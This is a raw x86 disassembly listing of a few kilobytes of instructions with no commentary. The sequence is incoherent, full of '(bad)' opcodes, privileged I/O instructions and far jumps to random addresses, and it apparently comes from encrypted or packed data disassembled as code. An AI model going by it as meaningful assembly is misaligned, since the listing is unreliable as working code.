  404f3c:	inc    DWORD PTR ds:0xe79c27f4
  404f42:	into   
  404f43:	sub    DWORD PTR [ebp-0x4bdd3fa8],ebx
  404f49:	es pop ebx
  404f4b:	sub    BYTE PTR [edx-0x2def68c2],ch
  404f51:	cmp    ecx,DWORD PTR [edx+0x325103ba]
  404f57:	stos   BYTE PTR es:[edi],al
  404f58:	mov    edi,ebx
  404f5a:	ja     0x404f83
  404f5c:	mov    bl,0xc5
  404f5e:	cmc    
  404f5f:	mov    edx,0xb25c971a
  404f64:	cmp    dh,BYTE PTR [ebx-0x605195ea]
  404f6a:	mov    dh,cl
  404f6c:	push   eax
  404f6d:	inc    eax
  404f6e:	jmp    0x404f23
  404f70:	clc    
  404f71:	(bad)  
  404f72:	cmp    eax,0xea23fe3
  404f77:	jae    0x404f55
  404f79:	js     0x404f1d
  404f7b:	cmp    esi,DWORD PTR [ebx]
  404f7d:	jns    0x404f25
  404f7f:	aad    0x4e
  404f81:	ret    0x501
  404f84:	adc    bh,ch
  404f86:	mov    esp,0xb8061c4a
  404f8b:	or     DWORD PTR [ecx+0x1f],esp
  404f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f8f:	sti    
  404f90:	xor    bh,BYTE PTR [edx-0x66146ebe]
  404f96:	fwait
  404f97:	aas    
  404f98:	and    al,BYTE PTR ds:0x809cbeda
  404f9e:	xchg   edi,eax
  404f9f:	cmp    eax,0xc72c099c
  404fa4:	popa   
  404fa5:	retf   0x9f16
  404fa8:	mov    ebx,ebx
  404faa:	(bad)  
  404fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fac:	push   edi
  404fad:	nop
  404fae:	daa    
  404faf:	pop    ebx
  404fb0:	adc    eax,0x38e299b3
  404fb5:	sub    DWORD PTR [ecx-0x77],edx
  404fb8:	and    al,0xa5
  404fba:	mov    edi,0xdb903acf
  404fbf:	sahf   
  404fc0:	push   ebx
  404fc1:	stos   DWORD PTR es:[edi],eax
  404fc2:	es sub edx,ebx
  404fc5:	and    eax,0x457e87b8
  404fca:	adc    dl,cl
  404fcc:	jne    0x404f8b
  404fce:	sbb    DWORD PTR [edx*2+0x35f652ab],esp
  404fd5:	test   BYTE PTR [edi-0xb],ch
  404fd8:	and    al,0x98
  404fda:	jl     0x404f78
  404fdc:	jo     0x405048
  404fde:	mov    edx,0x329797b9
  404fe3:	mov    dh,0xb8
  404fe5:	jmp    0x404fc0
  404fe7:	out    0xe7,al
  404fe9:	test   al,0x7d
  404feb:	xchg   ecx,eax
  404fec:	shl    DWORD PTR [esi],0xdd
  404fef:	inc    edx
  404ff0:	ror    DWORD PTR [ebp+0x59],0xa4
  404ff4:	sbb    eax,0x7a5122a6
  404ff9:	mov    eax,0x73887707
  404ffe:	mov    cl,0x6e
  405000:	or     ah,0x82
  405003:	and    al,0x91
  405005:	int3   
  405006:	fcomp  QWORD PTR [ebp+ecx*4-0x61e142b9]
  40500d:	push   edi
  40500e:	xor    edx,DWORD PTR [ecx-0x29b4daac]
  405014:	js     0x40504b
  405016:	jg     0x405091
  405018:	xor    eax,0x4e8adc1e
  40501d:	in     al,dx
  40501e:	inc    ecx
  40501f:	nop
  405020:	push   ecx
  405021:	leave  
  405022:	fistp  DWORD PTR [edx-0x2971fe59]
  405028:	arpl   WORD PTR [edi],si
  40502a:	lock jnp 0x405073
  40502d:	mov    ah,0x0
  40502f:	jp     0x405036
  405031:	xor    eax,0x15d52e29
  405036:	cmp    esi,DWORD PTR [esp+ecx*8+0x2920ba6b]
  40503d:	dec    edi
  40503e:	dec    ecx
  40503f:	sub    ah,0xde
  405042:	and    edi,0x3d
  405045:	int    0xf8
  405047:	sti    
  405048:	jo     0x40503e
  40504a:	sub    al,0xaf
  40504c:	scas   al,BYTE PTR es:[edi]
  40504d:	mov    eax,0x1126b014
  405052:	mov    eax,0x515cb714
  405057:	dec    ebp
  405058:	dec    eax
  405059:	mov    esi,0x35829236
  40505e:	lods   eax,DWORD PTR ds:[esi]
  40505f:	ret    
  405060:	cmp    ebx,esp
  405062:	xor    ch,ch
  405064:	dec    ebp
  405065:	jne    0x4050c3
  405067:	sbb    edx,ebp
  405069:	xor    DWORD PTR [edi],esp
  40506b:	dec    edx
  40506c:	out    dx,eax
  40506d:	inc    edx
  40506e:	(bad)  [esi+eax*2-0x3151f8b6]
  405075:	jge    0x40502a
  405077:	sub    eax,0xb2fc7096
  40507c:	xor    DWORD PTR [ecx+ecx*8],edi
  40507f:	pop    es
  405080:	lds    ecx,FWORD PTR [edi+0x4a1090f4]
  405086:	mov    esp,0xc186c6f4
  40508b:	mov    ecx,?
  40508d:	shr    BYTE PTR [ebp+0x217a8910],0xb9
  405094:	pop    ebp
  405095:	xor    eax,0x37be7735
  40509a:	je     0x4050bb
  40509c:	scas   al,BYTE PTR es:[edi]
  40509d:	sub    eax,0xf833f9d6
  4050a2:	xchg   edi,eax
  4050a3:	mov    al,ds:0xd07f82d7
  4050a8:	push   0x5a87b967
  4050ad:	fdiv   DWORD PTR [ecx+0x2f]
  4050b0:	xor    bl,BYTE PTR [ecx]
  4050b2:	or     edx,edi
  4050b4:	pop    ebp
  4050b5:	rcl    DWORD PTR [edi+0x46],0xa0
  4050b9:	inc    DWORD PTR [ebp-0x54d6e38e]
  4050bf:	mov    ebp,0x46f0a12
  4050c4:	pop    esp
  4050c5:	mov    al,ds:0x5f63f7e4
  4050ca:	sahf   
  4050cb:	enter  0x47b3,0x2e
  4050cf:	jmp    0x4050e4
  4050d1:	ja     0x4050cf
  4050d3:	adc    BYTE PTR [esi+0x4732649c],0xae
  4050da:	jno    0x4050a8
  4050dc:	(bad)
  4050df:	adc    al,0x5f
  4050e1:	call   0x63c2:0xfe39553c
  4050e8:	aas    
  4050e9:	jae    0x4050c2
  4050eb:	fnstenv [esi+0x75]
  4050ee:	test   BYTE PTR [edx],ch
  4050f0:	xor    eax,DWORD PTR [edx-0x5aca7537]
  4050f6:	(bad)  
  4050f8:	jnp    0x4050b8
  4050fa:	in     al,0xe3
  4050fc:	mov    ds:0xfa17aebc,al
  405101:	sbb    dl,al
  405103:	test   DWORD PTR [edx+edi*8+0x18],esi
  405107:	(bad)  
  405108:	add    ch,BYTE PTR es:[ebx+0x1e]
  40510c:	js     0x405161
  40510e:	leave  
  40510f:	pop    ebx
  405110:	inc    ebp
  405111:	push   ss
  405112:	cwde   
  405113:	js     0x405167
  405115:	inc    esi
  405116:	add    al,0xf6
  405118:	outs   dx,BYTE PTR ds:[esi]
  405119:	(bad)
  40511c:	add    ebp,DWORD PTR [ebx+0x4a]
  40511f:	xor    dl,BYTE PTR [ebp-0x2b]
  405122:	push   0x3d29466a
  405127:	xchg   cl,cl
  405129:	call   0x6378:0x78133dfc
  405130:	sub    edx,DWORD PTR [ebx+edi*2]
  405133:	fwait
  405134:	mov    edx,ebx
  405136:	shl    BYTE PTR [ebp-0x1d],1
  405139:	inc    esp
  40513a:	int3   
  40513b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40513c:	loope  0x405154
  40513e:	adc    esi,DWORD PTR [edi-0x3608dc87]
  405144:	push   esi
  405145:	xor    al,0xfe
  405147:	dec    eax
  405148:	icebp  
  405149:	adc    eax,0x331a3c04
  40514e:	sub    edi,DWORD PTR [edx+esi*2-0x499e63c3]
  405155:	mov    bh,0xb8
  405157:	and    BYTE PTR [ebx-0x18],ah
  40515a:	and    dl,BYTE PTR [edi]
  40515c:	aam    0xf2
  40515e:	icebp  
  40515f:	jl     0x4051a1
  405161:	sub    BYTE PTR [eax],al
  405163:	push   esp
  405164:	xchg   ecx,eax
  405165:	pop    ebp
  405166:	mov    ch,bh
  405168:	js     0x405188
  40516a:	cld    
  40516b:	pop    edx
  40516c:	(bad)  
  40516d:	xlat   BYTE PTR ds:[ebx]
  40516e:	rcr    BYTE PTR [eax-0x7],1
  405171:	ins    BYTE PTR es:[edi],dx
  405172:	mov    dl,BYTE PTR [ebx]
  405174:	jno    0x4051e4
  405176:	sub    DWORD PTR [eax-0x37],edi
  405179:	inc    edi
  40517a:	(bad)  
  40517b:	js     0x4051fa
  40517d:	or     al,0x3d
  40517f:	in     eax,dx
  405180:	mov    al,ds:0xeb08ba9b
  405185:	push   0xffffff8f
  405187:	dec    edi
  405188:	ds in  eax,0x4f
  40518b:	dec    esp
  40518c:	inc    ebx
  40518d:	pop    ds
  40518e:	or     esp,DWORD PTR [ebx]
  405190:	gs sub al,0x39
  405193:	(bad)  
  405194:	mov    ch,0x9b
  405196:	mov    al,0x7d
  405198:	dec    edi
  405199:	div    BYTE PTR [eax]
  40519b:	push   0xffffff96
  40519d:	xchg   ecx,eax
  40519e:	mov    DWORD PTR [esi],eax
  4051a0:	pop    ebp
  4051a1:	add    edx,esi
  4051a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051a4:	in     eax,0x6
  4051a6:	cli    
  4051a7:	nop
  4051a8:	pop    edi
  4051a9:	shr    BYTE PTR [eax+0x3],cl
  4051ac:	dec    ebx
  4051ad:	and    bl,dl
  4051af:	or     ecx,ecx
  4051b1:	cmp    BYTE PTR [edi-0x7eaf470d],0xea
  4051b8:	cs call 0x93f3:0xcd3ce99b
  4051c0:	lods   eax,DWORD PTR ds:[esi]
  4051c1:	adc    al,0x69
  4051c3:	sub    edi,edi
  4051c5:	fld    DWORD PTR [esi]
  4051c7:	popf   
  4051c8:	mov    edx,0x74cd60ef
  4051cd:	or     WORD PTR [ebx],dx
  4051d0:	dec    ebp
  4051d1:	outs   dx,DWORD PTR ds:[esi]
  4051d2:	inc    ebp
  4051d3:	fs push edx
  4051d5:	into   
  4051d6:	dec    esp
  4051d7:	gs nop
  4051d9:	pop    ss
  4051da:	xchg   ebp,edi
  4051dc:	pop    esi
  4051dd:	xchg   ecx,eax
  4051de:	pop    ss
  4051df:	jmp    0x2c9e1896
  4051e4:	xchg   BYTE PTR [eax+eiz*1-0x605e7810],dl
  4051eb:	push   ecx
  4051ec:	jg     0x40521e
  4051ee:	mov    ss,WORD PTR [esi+0x54cb798f]
  4051f4:	into   
  4051f5:	or     BYTE PTR [eax+edx*2],ah
  4051f8:	cmp    esi,esi
  4051fa:	call   0xbb5f:0x3edfd2f6
  405201:	imul   esi,DWORD PTR [edx+0x4e],0xbcfeef9c
  405208:	mov    dl,0x29
  40520a:	(bad)  
  40520b:	mov    dh,0xc7
  40520d:	ins    DWORD PTR es:[edi],dx
  40520e:	leave  
  40520f:	das    
  405210:	iret   
  405211:	and    BYTE PTR [ebp-0x7e],ah
  405214:	test   eax,0xd09c2203
  405219:	cmp    BYTE PTR [edi+edi*4],al
  40521c:	addr16 xor bh,ah
  40521f:	push   cs
  405220:	push   eax
  405221:	sbb    al,0xb1
  405223:	mov    esp,0x5e299c36
  405228:	test   BYTE PTR [edi+0x5a296e7a],ah
  40522e:	dec    edi
  40522f:	ficom  WORD PTR [ebp+edx*1+0x36f78ccb]
  405236:	jnp    0x405237
  405238:	or     al,al
  40523a:	neg    bh
  40523c:	inc    ebp
  40523d:	inc    edi
  40523e:	addr16 mov ah,0x76
  405241:	and    BYTE PTR ds:0x4990cf2c,cl
  405247:	pop    ecx
  405248:	pop    ecx
  405249:	loopne 0x405284
  40524b:	cmp    al,0x81
  40524d:	nop
  40524e:	sbb    DWORD PTR [ebx],esp
  405250:	and    bl,bl
  405252:	dec    esi
  405253:	ror    BYTE PTR [edx-0x70],cl
  405256:	add    al,0x56
  405258:	mov    ecx,0x28062221
  40525d:	sbb    ebp,eax
  40525f:	popa   
  405260:	mov    ecx,0x7921b11d
  405265:	test   DWORD PTR [ecx-0x7],ebp
  405268:	mov    ecx,0xeab15943
  40526d:	adc    eax,0xd6f857b9
  405272:	push   ecx
  405273:	fisubr DWORD PTR [esp+edx*2-0x71]
  405277:	scas   al,BYTE PTR es:[edi]
  405278:	mov    BYTE PTR [eax],dl
  40527a:	mov    esp,0xbcb78249
  40527f:	sti    
  405280:	loope  0x4052c3
  405282:	aad    0x4
  405284:	gs into 
  405286:	les    ebp,FWORD PTR [edx]
  405288:	test   DWORD PTR [edi+0x37d1eb3c],eax
  40528e:	jmp    0x9a632780
  405293:	dec    esi
  405294:	inc    eax
  405295:	into   
  405296:	rcr    BYTE PTR [ecx-0x19ce8dc6],1
  40529c:	and    al,0x1c
  40529e:	or     al,0xca
  4052a0:	jge    0x4052d9
  4052a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052a3:	repnz push 0x461bebb
  4052a9:	and    BYTE PTR [eax+esi*1-0x72],ch
  4052ad:	mov    eax,0x44c4e591
  4052b2:	stos   DWORD PTR es:[edi],eax
  4052b3:	cdq    
  4052b4:	fdiv   DWORD PTR [ebx-0x3978348f]
  4052ba:	cmp    al,BYTE PTR [ebp+0x7ad0ca68]
  4052c0:	mov    ebp,0xa2727300
  4052c5:	xchg   ebp,eax
  4052c6:	lahf   
  4052c7:	jb     0x4052c4
  4052c9:	pushf  
  4052ca:	ret    0x2397
  4052cd:	lods   eax,DWORD PTR ds:[esi]
  4052ce:	xor    eax,0x77376349
  4052d3:	sbb    BYTE PTR [esi-0x5455a574],0xd3
  4052da:	iret   
  4052db:	jecxz  0x405271
  4052dd:	out    dx,al
  4052de:	jne    0x4052c8
  4052e0:	add    ebx,edx
  4052e2:	add    eax,0xfecc35f8
  4052e7:	jl     0x40535a
  4052e9:	mov    ebx,0xdaa29194
  4052ee:	(bad)  
  4052ef:	pop    esi
  4052f0:	loope  0x40532b
  4052f2:	xor    al,0xa
  4052f4:	mov    al,ds:0x8df909d7
  4052f9:	jbe    0x40530b
  4052fb:	fcom   st(1)
  4052fd:	popa   
  4052fe:	mov    bl,BYTE PTR [ecx-0x31]
  405301:	adc    DWORD PTR [esi+0x26],0x783c072f
  405308:	es inc ecx
  40530a:	pop    edx
  40530b:	mov    DWORD PTR [edi-0x2c],esi
  40530e:	dec    ebp
  40530f:	adc    ebx,ecx
  405311:	xor    al,0xc8
  405313:	scas   eax,DWORD PTR es:[edi]
  405314:	(bad)  
  405315:	sbb    cl,BYTE PTR [edx-0x3749501b]
  40531b:	fs push ebp
  40531d:	xchg   esp,eax
  40531e:	fucomp st(5)
  405320:	das    
  405321:	mov    ah,0xa8
  405323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405324:	push   ecx
  405325:	in     eax,dx
  405326:	pop    esp
  405327:	rcl    DWORD PTR [eax-0x5f],cl
  40532a:	aam    0x30
  40532c:	adc    DWORD PTR [edx],edi
  40532e:	mov    WORD PTR [ebp-0x63],gs
  405331:	pop    ecx
  405332:	shr    DWORD PTR [edx+ebx*1],1
  405335:	sahf   
  405336:	imul   ecx,DWORD PTR [ebx-0x58],0x22dc6e95
  40533d:	adc    al,0x28
  40533f:	or     BYTE PTR [esi+edi*8],al
  405342:	xor    BYTE PTR [edi-0x78a81527],bl
  405348:	test   DWORD PTR [edi],eax
  40534a:	jae    0x4052f7
  40534c:	jae    0x40539d
  40534e:	or     ecx,DWORD PTR [ecx+0x7ba296bd]
  405354:	sar    ebx,1
  405356:	mov    ds:0x7528e5e3,eax
  40535b:	mov    ebp,DWORD PTR [eax-0x42]
  40535e:	inc    edx
  40535f:	sub    dh,dh
  405361:	cmp    BYTE PTR [ebx+0x34f3cb10],al
  405367:	jbe    0x405319
  405369:	ret    
  40536a:	mov    ebp,0xc6887306
  40536f:	ins    BYTE PTR es:[edi],dx
  405370:	add    ch,bh
  405372:	int3   
  405373:	ss add ebx,0x4bdfe709
  40537a:	jbe    0x40536f
  40537c:	mov    ch,0x31
  40537e:	and    eax,0x38d30b7a
  405383:	cli    
  405384:	scas   eax,DWORD PTR es:[edi]
  405385:	mov    ds,ebx
  405387:	or     DWORD PTR [esi+edx*2+0x5],ebp
  40538b:	jmp    0x4053e0
  40538d:	push   ss
  40538e:	cmp    eax,0x85bc5510
  405393:	lahf   
  405394:	and    al,0xc9
  405396:	xchg   DWORD PTR [edi+0xc],esi
  405399:	lods   eax,DWORD PTR ds:[esi]
  40539a:	cmc    
  40539b:	push   edx
  40539c:	popa   
  40539d:	lds    esi,FWORD PTR [edi-0x7f4ae810]
  4053a3:	out    0xa2,al
  4053a5:	add    DWORD PTR [edx-0x1a8bc0ce],eax
  4053ab:	mov    dl,0x7a
  4053ad:	(bad)  
  4053ae:	mov    BYTE PTR [eax+edi*2+0x41],al
  4053b2:	shr    al,cl
  4053b4:	jo     0x4053f6
  4053b6:	call   0x57c5:0x82644030
  4053bd:	or     BYTE PTR ds:[ebx],cl
  4053c0:	mov    esi,0xe3c64890
  4053c5:	ins    BYTE PTR es:[edi],dx
  4053c6:	fcmovb st,st(0)
  4053c8:	not    DWORD PTR ds:0x9e1b881f
  4053ce:	addr16 pop esi
  4053d0:	jo     0x4053cd
  4053d2:	dec    ecx
  4053d3:	fidivr WORD PTR [esi]
  4053d5:	jmp    0x2d033b30
  4053da:	enter  0xdb7d,0x49
  4053de:	add    eax,DWORD PTR ds:0x42b43a2d
  4053e4:	xor    eax,0x707a7192
  4053e9:	popf   
  4053ea:	aad    0xba
  4053ec:	cli    
  4053ed:	rcl    DWORD PTR es:[edx-0x4d],cl
  4053f1:	or     al,0x8b
  4053f3:	adc    BYTE PTR [esi],ah
  4053f5:	sbb    bl,BYTE PTR [ebp+0x52a55648]
  4053fb:	adc    eax,0x1a799d14
  405400:	xor    BYTE PTR [eax],ch
  405402:	mov    ebp,0xd8fd2313
  405407:	dec    edi
  405408:	int    0x54
  40540a:	sbb    BYTE PTR [esi],dh
  40540c:	sahf   
  40540d:	lock bound esp,QWORD PTR [ebx-0x42]
  405411:	jne    0x4053f0
  405413:	pop    ebx
  405414:	push   esp
  405415:	jo     0x40546c
  405417:	push   ecx
  405418:	mov    ch,0x47
  40541a:	outs   dx,DWORD PTR ds:[esi]
  40541b:	add    eax,0xb6851d2e
  405420:	out    dx,al
  405421:	shl    DWORD PTR [eax+ebp*1],0x4d
  405425:	add    BYTE PTR [esi],bh
  405427:	pop    ecx
  405428:	test   DWORD PTR [edi+0x3e],ecx
  40542b:	inc    edx
  40542c:	and    eax,0x3143d375
  405431:	ror    BYTE PTR [edi+0x4d],cl
  405434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405435:	data16 fidiv DWORD PTR [eax+0x62]
  405439:	out    dx,eax
  40543a:	push   edx
  40543b:	sahf   
  40543c:	or     DWORD PTR [edx],esi
  40543e:	pushf  
  40543f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405440:	push   esi
  405441:	xchg   ebx,eax
  405442:	cs push esi
  405445:	in     eax,dx
  405446:	mov    al,ds:0xf8998c58
  40544b:	call   0x2aef:0x88d1bf43
  405452:	stos   DWORD PTR es:[edi],eax
  405453:	adc    bh,BYTE PTR ds:0xb06be35e
  405459:	nop
  40545a:	jne    0x40545a
  40545c:	mov    al,0xc1
  40545e:	cld    
  40545f:	out    0x95,eax
  405461:	mov    ecx,0x9d1763ab
  405466:	popa   
  405467:	inc    ecx
  405468:	mov    al,ds:0x3f36b30d
  40546d:	sti    
  40546e:	nop
  40546f:	push   ecx
  405470:	push   cs
  405471:	popa   
  405472:	enter  0x2e5,0x32
  405476:	cmp    eax,0x261fc485
  40547b:	push   ds
  40547c:	(bad)  
  40547d:	or     eax,0x41e27472
  405482:	sbb    DWORD PTR [ecx-0x3135af9c],0x22
  405489:	xchg   edx,eax
  40548a:	shl    DWORD PTR [ebx-0x57],cl
  40548d:	xchg   ecx,eax
  40548e:	je     0x405472
  405490:	das    
  405491:	jne    0x4054ff
  405493:	(bad)  
  405494:	sahf   
  405495:	rcl    DWORD PTR [edx-0x76],0xe2
  405499:	adc    BYTE PTR [esp+ecx*1-0x539944cb],ch
  4054a0:	nop/reserved BYTE PTR [ecx+edi*2+0x7f]
  4054a5:	mov    al,0x4e
  4054a7:	outs   dx,DWORD PTR ds:[esi]
  4054a8:	xchg   esi,eax
  4054a9:	jmp    0x4054bd
  4054ab:	(bad)  
  4054ac:	jns    0x405485
  4054ae:	sbb    BYTE PTR [esi],dl
  4054b0:	xor    DWORD PTR [esi+0xf],0xffffff95
  4054b4:	mov    ebx,DWORD PTR [ebx-0xfce0960]
  4054ba:	sbb    eax,0x8117c54f
  4054bf:	(bad)  
  4054c0:	mov    ch,0xc8
  4054c2:	aas    
  4054c3:	popf   
  4054c4:	mov    WORD PTR [esi+esi*8-0x9],fs
  4054c8:	push   0x57c1e32
  4054cd:	mov    ?,WORD PTR [ecx+eax*4-0x7d]
  4054d1:	lock ja 0x4054d6
  4054d4:	pop    eax
  4054d5:	mov    eax,0x25f00ffa
  4054da:	pushf  
  4054db:	push   ebx
  4054dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054dd:	ret    
  4054de:	mov    WORD PTR [ebx],?
  4054e0:	ja     0x405524
  4054e2:	sbb    ah,BYTE PTR [ecx+eiz*8+0x34]
  4054e6:	inc    esp
  4054e7:	push   ecx
  4054e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054e9:	std    
  4054ea:	aas    
  4054eb:	mov    ebp,0x27d66b0a
  4054f0:	and    eax,0x3a2c3dc4
  4054f5:	push   eax
  4054f6:	rol    BYTE PTR [edi],cl
  4054f8:	jg     0x4054cf
  4054fa:	xchg   esi,eax
  4054fb:	pop    ss
  4054fc:	(bad)  
  405500:	sub    al,0xaf
  405502:	shr    DWORD PTR ds:[ecx+0x1bcac7f9],1
  405509:	das    
  40550a:	(bad)  
  40550c:	je     0x405551
  40550e:	test   BYTE PTR [edi-0x6d183e90],bh
  405514:	mov    ch,0x4
  405516:	jecxz  0x40551e
  405518:	sar    edi,1
  40551a:	pop    ecx
  40551b:	cmp    edi,esi
  40551d:	pop    eax
  40551e:	cld    
  40551f:	fisub  WORD PTR [ecx]
  405521:	pop    es
  405522:	enter  0x64c9,0x51
  405526:	inc    eax
  405527:	or     al,0x4d
  405529:	adc    DWORD PTR [ecx],eax
  40552b:	xor    edi,ebx
  40552d:	sbb    al,0x6
  40552f:	(bad)  
  405531:	ss cwde 
  405533:	or     al,BYTE PTR [ebx]
  405535:	imul   ecx,ebp,0xffffffda
  405538:	fiadd  WORD PTR [esi]
  40553a:	adc    al,0x8d
  40553c:	ss test eax,ecx
  40553f:	int    0x5c
  405541:	loopne 0x405524
  405543:	cli    
  405544:	push   esp
  405545:	iret   
  405546:	push   edx
  405547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405548:	adc    BYTE PTR [edx+0x75411b6f],0xfd
  40554f:	(bad)  
  405550:	adc    cl,dl
  405552:	push   ebp
  405553:	daa    
  405554:	pop    edi
  405555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405556:	jecxz  0x4054ed
  405558:	nop
  405559:	popa   
  40555a:	jmp    0x560d0d08
  40555f:	retf   0x5935
  405562:	xor    ch,BYTE PTR [ebx+0x42]
  405565:	loop   0x4055a2
  405567:	lea    esi,[eax]
  405569:	leave  
  40556a:	pusha  
  40556b:	and    BYTE PTR [eax-0x70],bh
  40556e:	sub    BYTE PTR [eax-0x33160e16],bh
  405574:	sub    al,0x63
  405576:	lea    ebp,[eax-0x471b85f6]
  40557c:	dec    esi
  40557d:	mov    ebx,0x3c37af5e
  405582:	sub    BYTE PTR [edi-0x4cd2f53c],0x54
  405589:	iret   
  40558a:	sbb    DWORD PTR [ecx-0x1728a043],ebx
  405590:	sbb    esp,DWORD PTR [esi]
  405592:	bswap  ecx
  405594:	icebp  
  405595:	fwait
  405596:	addr16 mov ecx,0xcffb3548
  40559c:	pop    esp
  40559d:	icebp  
  40559e:	push   edi
  40559f:	out    dx,al
  4055a0:	cwde   
  4055a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a2:	test   al,0xb3
  4055a4:	push   ds
  4055a5:	mov    ah,0xd
  4055a7:	mov    DWORD PTR [eax+0x57],edi
  4055aa:	mov    bl,0x3a
  4055ac:	push   ebx
  4055ad:	add    DWORD PTR [ecx],ebx
  4055af:	pop    es
  4055b0:	adc    eax,0xbf25bbc4
  4055b5:	iret   
  4055b6:	adc    eax,0xe069ea1
  4055bb:	xchg   ebp,eax
  4055bc:	mov    ch,0x34
  4055be:	sub    dh,BYTE PTR [edx-0x689d925b]
  4055c4:	pop    esi
  4055c5:	lods   eax,DWORD PTR ds:[esi]
  4055c6:	and    eax,edx
  4055c8:	sbb    eax,0x6b7c0a77
  4055cd:	mov    bh,ch
  4055cf:	inc    esp
  4055d0:	mov    ds:0x7658a51a,eax
  4055d5:	push   0x1b
  4055d7:	and    DWORD PTR [ecx-0x3c],edx
  4055da:	mov    eax,ebp
  4055dc:	cmp    bl,cl
  4055de:	dec    edx
  4055df:	call   0x1c0e:0xd35ead1f
  4055e6:	inc    BYTE PTR [edx+0x3e]
  4055e9:	inc    ecx
  4055ea:	lods   eax,DWORD PTR ds:[si]
  4055ec:	dec    edi
  4055ed:	nop
  4055ee:	js     0x405627
  4055f0:	sub    eax,0x8f6e41d6
  4055f5:	cdq    
  4055f6:	sbb    cl,0x62
  4055f9:	jae    0x405616
  4055fb:	pop    edx
  4055fc:	jmp    0x6aaa798b
  405601:	sahf   
  405602:	or     BYTE PTR [ebx+ebp*8-0x71],bl
  405606:	inc    eax
  405607:	and    edi,DWORD PTR [esi]
  405609:	dec    eax
  40560a:	xchg   esp,eax
  40560b:	nop
  40560c:	push   0x30689466
  405611:	bound  eax,QWORD PTR [ebx+0x33ceb46]
  405617:	xor    al,0x31
  405619:	mov    ebp,0xd7dcb037
  40561e:	xlat   BYTE PTR ds:[ebx]
  40561f:	scas   al,BYTE PTR es:[edi]
  405620:	test   eax,0x2d2ddda1
  405625:	inc    ebp
  405626:	xlat   BYTE PTR ds:[ebx]
  405627:	cdq    
  405628:	and    DWORD PTR [ecx+0x4c],ebp
  40562b:	mov    esi,DWORD PTR fs:[ebx+0x26a643d2]
  405632:	nop
  405633:	imul   ecx,DWORD PTR [ebp-0x672ed113],0x659d21ba
  40563d:	arpl   WORD PTR [ebp-0x5746265b],ax
  405643:	cmp    al,0xe3
  405645:	les    ebp,FWORD PTR [edi-0x5a]
  405648:	jnp    0x405690
  40564a:	in     eax,0xcd
  40564c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40564d:	sbb    al,0xa8
  40564f:	cli    
  405650:	inc    ebx
  405651:	popa   
  405652:	sub    al,0x84
  405654:	and    eax,0x599dae7c
  405659:	pop    ds
  40565a:	or     al,0x76
  40565c:	popa   
  40565d:	aam    0xe7
  40565f:	inc    esp
  405660:	add    al,dh
  405662:	mov    esi,0x74e8bf62
  405667:	sti    
  405668:	and    eax,ebx
  40566a:	xchg   edx,eax
  40566b:	xchg   edi,ebp
  40566d:	add    BYTE PTR [edx+eax*1],al
  405670:	(bad)  
  405671:	lahf   
  405672:	nop
  405673:	in     al,dx
  405674:	or     ch,BYTE PTR [ebp+0x662cd31c]
  40567a:	push   ss
  40567b:	pop    edi
  40567c:	xchg   DWORD PTR [ebx-0x7c],ecx
  40567f:	ficom  DWORD PTR [edi-0x732d3ccb]
  405685:	push   edx
  405686:	jns    0x4056de
  405688:	add    DWORD PTR [edi+eiz*8],edi
  40568b:	sub    esi,esi
  40568d:	stos   DWORD PTR es:[edi],eax
  40568e:	fsubrp st(3),st
  405690:	push   ebp
  405691:	dec    esp
  405692:	mov    esi,0xb8fb8ff
  405697:	dec    ebx
  405698:	das    
  405699:	pop    ecx
  40569a:	adc    ebx,esi
  40569c:	mov    WORD PTR [esi+0x2f],gs
  40569f:	call   0x5e704135
  4056a4:	jb     0x40569a
  4056a6:	sub    DWORD PTR [edx+edi*1+0x3c],esi
  4056aa:	or     al,0xa4
  4056ac:	iret   
  4056ad:	ss mov dl,0x4e
  4056b0:	fcom   DWORD PTR [ebx]
  4056b2:	inc    esp
  4056b3:	stos   DWORD PTR es:[edi],eax
  4056b4:	jb     0x405714
  4056b6:	imul   eax,DWORD PTR [ebp+0x8],0x1958a441
  4056bd:	shr    DWORD PTR [ebp+ebx*1-0x5d],cl
  4056c1:	or     bh,dl
  4056c3:	push   ss
  4056c4:	stos   DWORD PTR es:[edi],eax
  4056c5:	test   eax,ebx
  4056c7:	nop
  4056c8:	scas   al,BYTE PTR es:[edi]
  4056c9:	jbe    0x40565f
  4056cb:	stos   DWORD PTR es:[edi],eax
  4056cc:	mov    ch,0xed
  4056ce:	mov    esi,0x52401083
  4056d3:	xchg   esp,eax
  4056d4:	adc    cl,BYTE PTR [edx-0x7c750e7c]
  4056da:	cdq    
  4056db:	and    al,BYTE PTR [ecx]
  4056dd:	neg    BYTE PTR [esi+0x77]
  4056e0:	and    dl,BYTE PTR [eax+eax*2+0x207c8ef8]
  4056e7:	imul   esi,DWORD PTR [esi],0xffffffcf
  4056ea:	or     ch,BYTE PTR [ecx]
  4056ec:	aaa    
  4056ed:	xchg   DWORD PTR [esp+eax*8-0x66],edi
  4056f1:	dec    ebp
  4056f2:	fcmovne st,st(6)
  4056f4:	aam    0x98
  4056f6:	pop    edx
  4056f7:	mov    ds:0x16c964f5,eax
  4056fc:	std    
  4056fd:	dec    esp
  4056fe:	inc    esi
  4056ff:	ficom  WORD PTR [eax]
  405701:	inc    ecx
  405702:	and    cl,BYTE PTR [edi+0x998bd46]
  405708:	and    bh,BYTE PTR [edx+ecx*1-0x44133732]
  40570f:	xchg   edx,eax
  405710:	lods   al,BYTE PTR ds:[esi]
  405711:	popf   
  405712:	ins    DWORD PTR es:[edi],dx
  405713:	lds    esp,FWORD PTR [ebx-0x33331b83]
  405719:	pop    ebx
  40571a:	int3   
  40571b:	ret    0xc896
  40571e:	call   0x16da:0x7fab771a
